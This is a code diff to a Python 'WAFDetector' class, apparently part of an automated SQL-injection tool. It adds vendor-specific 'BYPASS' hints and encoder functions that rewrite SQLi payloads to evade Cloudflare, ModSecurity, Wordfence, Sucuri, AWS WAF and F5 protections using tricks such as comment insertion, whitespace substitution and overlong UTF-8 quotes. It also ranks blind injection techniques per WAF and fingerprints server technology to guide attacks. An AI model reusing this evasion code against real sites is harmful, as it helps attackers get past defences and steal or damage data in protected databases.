@@ -614,29 +614,42 @@ class WAFDetector:
                 "Use different User-Agent rotation",
                 "Rate limit requests to avoid triggering rules",
                 "Try URL encoding/double encoding payloads",
+                "BYPASS: Use %0A (newline) between UNION and SELECT",
+                "BYPASS: Replace spaces with %09 (tab) or %0c (form feed)",
             ])
         elif info.waf == "ModSecurity":
             hints.extend([
-                "Try comment-based obfuscation: /*!50000UNION*/",
-                "Try mixed case: uNiOn SeLeCt",
-                "Use inline comments: UN/**/ION SE/**/LECT",
-                "Try HTTP parameter pollution",
+                "BYPASS: /*!50000UNION*/ /*!50000SELECT*/ (versioned comments)",
+                "BYPASS: UN/**/ION SE/**/LECT (inline comments)",
+                "BYPASS: mixed case uNiOn SeLeCt",
+                "BYPASS: HTTP parameter pollution",
+                "BYPASS: && instead of AND, || instead of OR",
             ])
         elif info.waf in ("F5 BIG-IP ASM", "Incapsula/Imperva"):
             hints.extend([
                 "Extremely difficult to bypass - consider skipping",
-                "Try encoding variations if proceeding",
+                "BYPASS: Try overlong UTF-8 encoding %c0%a7 for apostrophe",
+                "BYPASS: Time-based blind only viable approach",
             ])
         elif info.waf == "Wordfence":
             hints.extend([
                 "WordPress-specific WAF - some SQLi patterns bypass",
-                "Try time-based blind SQLi",
-                "Use chunked transfer encoding",
+                "BYPASS: UNION%23%0ASELECT (hash+newline)",
+                "BYPASS: /**_**/ as space replacement",
+                "BYPASS: && for AND, || for OR",
+                "BYPASS: Use chunked transfer encoding",
             ])
         elif info.waf == "Sucuri":
             hints.extend([
-                "Try direct origin IP access",
-                "Use alternative encoding schemes",
+                "BYPASS: Try direct origin IP access",
+                "BYPASS: Use %0B (vertical tab) between keywords",
+                "BYPASS: Alternative encoding schemes",
+            ])
+        elif info.waf == "AWS WAF":
+            hints.extend([
+                "BYPASS: UNION%23%0a SELECT (comment+newline)",
+                "BYPASS: %0c (form feed) as space replacement",
+                "BYPASS: Time-based and boolean blind preferred",
             ])
         
         if info.bot_protection in ("DataDome", "PerimeterX", "Kasada"):
@@ -646,6 +659,119 @@ class WAFDetector:
             hints.append("No WAF/bot protection detected - standard payloads should work")
         
         return hints
+
+    def get_bypass_encoders(self, waf_name: str) -> List:
+        """Return actual encoding functions for bypassing a specific WAF.
+        
+        These can be applied to payloads to evade WAF rules.
+        """
+        import re as _re
+        
+        encoders = {
+            "Cloudflare": [
+                lambda p: p.replace("UNION", "UNI%0AON").replace("SELECT", "SEL%0AECT"),
+                lambda p: p.replace(" ", "%09"),
+                lambda p: p.replace("'", "%EF%BC%87"),
+                lambda p: _re.sub(r'UNION\s+SELECT', 'UNION%23%0ASELECT', p, flags=_re.I),
+            ],
+            "ModSecurity": [
+                lambda p: p.replace("UNION", "/*!50000UNION*/").replace("SELECT", "/*!50000SELECT*/"),
+                lambda p: p.replace(" ", "/**/"),
+                lambda p: _re.sub(r'(AND|OR)', lambda m: f'/*!{m.group()}*/', p, flags=_re.I),
+            ],
+            "Wordfence": [
+                lambda p: p.replace("UNION SELECT", "UNION%23%0ASELECT"),
+                lambda p: p.replace(" ", "/**_**/"),
+                lambda p: p.replace("AND", "&&").replace("OR", "||"),
+            ],
+            "Sucuri": [
+                lambda p: p.replace("UNION", "UNI%0BON").replace("SELECT", "SE%0BLECT"),
+                lambda p: p.replace(" ", chr(0x0a)),
+            ],
+            "AWS WAF": [
+                lambda p: p.replace("UNION", "UNION%23%0a").replace("SELECT", "SELECT%23%0a"),
+                lambda p: p.replace(" ", "%0c"),
+            ],
+            "F5 BIG-IP ASM": [
+                lambda p: p.replace("'", "%c0%a7"),
+                lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN"),
+            ],
+        }
+        
+        return encoders.get(waf_name, [])
+
+    def get_preferred_techniques(self, waf_name: str) -> List[str]:
+        """Return preferred SQLi techniques for bypassing a specific WAF.
+        
+        Returns list of technique names ordered by bypass likelihood.
+        """
+        preferences = {
+            "Cloudflare": ["time", "boolean"],
+            "ModSecurity": ["error", "union", "time"],
+            "Wordfence": ["time", "boolean"],
+            "Sucuri": ["time", "error"],
+            "F5 BIG-IP ASM": ["time"],
+            "Incapsula/Imperva": ["time"],
+            "AWS WAF": ["time", "boolean"],
+            "Barracuda": ["time", "error"],
+        }
+        return preferences.get(waf_name, ["error", "union", "boolean", "time"])
+
+    def detect_server_tech(self, headers: Dict, body: str = "") -> Dict[str, str]:
+        """Detect server technology stack from headers and body content.
+        
+        Returns dict with detected technology info.
+        """
+        tech = {}
+        
+        server = headers.get("Server", headers.get("server", ""))
+        powered_by = headers.get("X-Powered-By", headers.get("x-powered-by", ""))
+        
+        if server:
+            tech["server"] = server
+            if "nginx" in server.lower():
+                tech["web_server"] = "nginx"
+            elif "apache" in server.lower():
+                tech["web_server"] = "apache"
+            elif "microsoft-iis" in server.lower():
+                tech["web_server"] = "iis"
+            elif "litespeed" in server.lower():
+                tech["web_server"] = "litespeed"
+        
+        if powered_by:
+            tech["powered_by"] = powered_by
+            if "php" in powered_by.lower():
+                tech["language"] = "php"
+            elif "asp.net" in powered_by.lower():
+                tech["language"] = "asp.net"
+            elif "express" in powered_by.lower():
+                tech["language"] = "node"
+        
+        # Check body for more tech indicators
+        if body:
+            if re.search(r'wp-content|wordpress', body, re.I):
+                tech["cms"] = "wordpress"
+                tech["language"] = "php"
+                tech["likely_db"] = "mysql"
+            elif re.search(r'drupal', body, re.I):
+                tech["cms"] = "drupal"
+                tech["language"] = "php"
+            elif re.search(r'joomla', body, re.I):
+                tech["cms"] = "joomla"
+                tech["language"] = "php"
+                tech["likely_db"] = "mysql"
+            elif re.search(r'laravel', body, re.I):
+                tech["cms"] = "laravel"
+                tech["language"] = "php"
+            elif re.search(r'django', body, re.I):
+                tech["framework"] = "django"
+                tech["language"] = "python"
+                tech["likely_db"] = "postgresql"
+            elif re.search(r'\.aspx|__VIEWSTATE', body, re.I):
+                tech["language"] = "asp.net"
+                tech["likely_db"] = "mssql"
+        
+        return tech
 
     async def batch_detect(self, urls: List[str]) -> List[ProtectionInfo]:
         """Detect protections for multiple URLs concurrently.
